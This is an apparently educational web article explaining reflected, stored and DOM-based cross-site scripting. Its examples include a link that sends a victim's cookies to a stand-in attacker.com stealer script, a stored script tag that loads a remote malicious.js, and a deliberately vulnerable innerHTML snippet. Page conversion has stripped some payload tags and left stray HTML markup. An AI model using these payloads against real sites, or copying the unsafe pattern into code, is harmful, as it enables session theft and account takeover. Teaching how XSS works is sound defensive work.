\## 💥 Understanding the 3 Main Types of XSS

\*\*Cross-Site Scripting (XSS)\*\* is a common web security vulnerability that allows an attacker to inject client-side scripts (usually JavaScript) into a web page viewed by other users. Think of it as slipping a malicious note into a perfectly normal conversation. The web browser trusts the source, so it executes the script, giving the attacker access to cookies, session tokens, or other sensitive information.

There are three main ways this sneaky script can get delivered:

\-----

\## 1\\. Reflected XSS: The Echo Attack

\*\*Reflected XSS\*\* is the simplest and most common type. The malicious script is delivered to the victim \*within the response\* that the server sends immediately after receiving the request. It's like an echo—whatever the attacker sends to the server is immediately sent back (reflected) to the user's browser, which then executes the script.

\### 📝 \*\*How it Works (The Real-Time Example)\*\*

Imagine a website's search page: \`https://shop.com/search?query=sneakers\`

1\. \*\*Normal Flow:\*\* When you search for \`sneakers\`, the page title might say: "Showing results for: \*\*sneakers\*\*." The server took your input and "reflected" it back to the page.

2\. \*\*Attack Flow:\*\* The attacker crafts a malicious link and sends it to a victim via email or chat:

\`https://shop.com/search?query=document.location=&#x27;http://attacker.com/cookie\_stealer.php?c=&#x27;+document.cookie\`

3\. \*\*The Result:\*\* When the victim clicks the link, the server still treats the input as just a "search term" and reflects the entire \`\` tag onto the results page. The victim&#x27;s browser sees this as legitimate code from \`shop.com\` and executes it, sending the victim&#x27;s session cookies straight to the attacker.</p><p class="slate-paragraph"></p><p class="slate-paragraph">\*\*🔑 Key Takeaway:\*\* The malicious code is \*never stored\* on the server; it travels in the URL and is executed only when the user clicks the crafted link.</p><p class="slate-paragraph"></p><p class="slate-paragraph">-----</p><p class="slate-paragraph"></p><p class="slate-paragraph">## 2\\. Stored XSS: The Time Bomb Attack</p><p class="slate-paragraph"></p><p class="slate-paragraph">\*\*Stored XSS\*\* (also known as Persistent XSS) is the most dangerous type because the malicious code is permanently saved on the target web application&#x27;s server (usually in a database). Once stored, it affects \*every user\* who views the compromised page.</p><p class="slate-paragraph"></p><p class="slate-paragraph">### 📝 \*\*How it Works (The Real-Time Example)\*\*</p><p class="slate-paragraph"></p><p class="slate-paragraph">Imagine a site with a comment section or a product review page:</p><p class="slate-paragraph"></p><p class="slate-paragraph">1. \*\*Normal Flow:\*\* A user writes a product review: "This shirt is great\\!" This text is saved in the database and displayed to all future visitors of that product page.</p><p class="slate-paragraph">2. \*\*Attack Flow:\*\* The attacker posts a review, but instead of text, they embed a malicious script:</p><p class="slate-paragraph"> \`This shirt is terrible! <script src="http://attacker.com/malicious.js">\`

3\. \*\*The Result:\*\* The web server saves this script in the database. When any future user (including the site administrator) visits that product page, the server fetches the malicious review from the database and sends it to the user's browser. The browser executes the script, compromising every visitor, without the attacker needing to send individual links.

\*\*🔑 Key Takeaway:\*\* The malicious code is a \*\*time bomb\*\* that is saved permanently on the server and delivered automatically to multiple victims.

\-----

\## 3\\. DOM-based XSS: The Client-Side Attack

\*\*DOM-based XSS\*\* is different because the vulnerability and the attack don't rely on the web server at all. Instead, the vulnerability lies within the client-side code (JavaScript) that runs inside the user's browser, specifically how that code handles data within the \*\*Document Object Model (DOM)\*\*.

\[Image of Document Object Model (DOM) structure\]

\### 📝 \*\*How it Works (The Real-Time Example)\*\*

Imagine a simple page with client-side JavaScript that takes a URL parameter and displays it directly onto the page \*without\* sending it to the server.

A vulnerable piece of JavaScript might look like this:

\`\`\`javascript

// This code takes a URL fragment and writes it to the page element

var lang = document.location.hash.substring(1);

document.getElementById("greeting").innerHTML = "Hello, " + lang;

\`\`\`

1\. \*\*Normal Flow:\*\* The URL is \`https://site.com/welcome#English\`. The JavaScript extracts \`English\` and displays: "Hello, English."

2\. \*\*Attack Flow:\*\* The attacker crafts a link using the URL fragment (\`#\`) and sends it to a victim:

\`https://site.com/welcome#alert(&#x27;DOM Hacked!&#x27;)\`

3\. \*\*The Result:\*\* The part of the URL after the \`#\` (\`#...\`) is \*\*never sent to the server\*\*. The victim&#x27;s browser loads the page, the vulnerable client-side JavaScript runs, grabs the malicious script from the URL, and writes it directly into the HTML of the page&#x27;s DOM. The browser executes the script, completing the attack.</p><p class="slate-paragraph"></p><p class="slate-paragraph">\*\*🔑 Key Takeaway:\*\* The server never sees the malicious code. The vulnerability occurs entirely within the victim&#x27;s browser when vulnerable JavaScript code processes untrusted input.</p></x-turndown>
